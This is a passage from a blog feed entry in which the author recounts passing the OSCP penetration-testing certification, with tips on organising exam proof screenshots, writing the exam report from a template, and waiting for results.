│   │    ├── Screenshot with ipconfig/ifconfig
│   │    └── Submitted in Control Panel
│   ├── proof.txt
│   │    ├── Screenshot with ipconfig/ifconfig
│   │    └── Submitted in Control Panel
├── Box 2 - 192.168.X.X
│    ├── local.txt
│    │    ├── Screenshot with ipconfig/ifconfig
│    │    └── Submitted in Control Panel
│    └── proof.txt
│         ├── Screenshot with ipconfig/ifconfig
│         └── Submitted in Control Panel
└── etc...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;report-tips&quot;&gt;Report Tips&lt;/h3&gt;

&lt;p&gt;Pre-stage your report. You can prep a decent portion of the report prior to the exam. This will save you some time after your exam ends. Even though I did this, I still spent roughly 10 hours compiling my 56 page report for submission. I did not try to reinvent the wheel and used the &lt;a href=&quot;https://support.offensive-security.com/pwk-reporting/&quot; target=&quot;_blank&quot;&gt;recommended template&lt;/a&gt;, only modifying it to fit the exam requirements.&lt;/p&gt;

&lt;p&gt;Don’t “YOLO” the report. It’s &lt;em&gt;part&lt;/em&gt; of the challenge. Be meticulous and triple-check everything. Before you submit, reread the &lt;a href=&quot;https://support.offensive-security.com/oscp-exam-guide/&quot; target=&quot;_blank&quot;&gt;Test Guide&lt;/a&gt; and &lt;a href=&quot;https://support.offensive-security.com/pwk-reporting/&quot; target=&quot;_blank&quot;&gt;PWK Reporting Guidelines&lt;/a&gt; and check your formatting, security and compression.&lt;/p&gt;

&lt;p&gt;I used this report structure to include my findings of the exam, found on &lt;a href=&quot;https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#exam&quot; target=&quot;_blank&quot;&gt;scund00r’s blog&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Offensive Security Exam Penetration Test Report
│   ├── Introduction
│   ├── Objective
│   └── Scope
├── High-Level Summary
│   └── Recommendations
├── Methodologies
│   ├── Information Gathering
│   ├── Service Enumeration
│   ├── Penetration
│   ├── Maintaining Access
│   └── House Cleaning
└── Findings
    ├── Box1 - 10.10.10.1
    ├── Box2 - 10.10.10.2
    ├── Box3 - 10.10.10.3
    ├── Box4 - 10.10.10.4
    └── Box5 - 10.10.10.5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;results&quot;&gt;Results&lt;/h2&gt;
&lt;p&gt;It took 6 days to get my results - 4 business days and a weekend. While it felt like the longest wait of my life, the results finally came in and it was official, I had passed the OSCP.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://gr0sabi.github.io/assets/images/oscp-post/20190412_135924-min.jpg&quot; alt=&quot;OSCP Certificate&quot; /&gt;&lt;/p&gt;
&lt;figcaption&gt;Woohoo! I did it. :joy: &lt;/figcaption&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h2&gt;
&lt;p&gt;I &lt;em&gt;really&lt;/em&gt; enjoyed everything. The PWK course and the OSCP Exam Challenge was one of the most rewarding and humbling learning experiences I’ve professionally had. It’s one of very few certifications that lets you feel part of a community that is passionate about Information Security. Now to really dig deep and go for &lt;del&gt;OCSE&lt;/del&gt; AWAE/OSWE!&lt;/p&gt;

&lt;p&gt;Good luck, try harder, and DM me on &lt;a href=&quot;https://twitter.com/gr0sabi&quot; target=&quot;_blank&quot;&gt;Twitter&lt;/a&gt; if you need anything.&lt;/p&gt;</content><author><name>J.D. Grow</name></author><category term="certification" /><category term="oscp" /><category term="hacking" /><category term="penetration testing" /><category term="offensive security" /><category term="certification" /><summary type="html">I wrote this post to give back some of the insights I've discovered on my journey to becoming an OSCP. It will cover personal insights, resources, and best practices.</summary></entry></feed>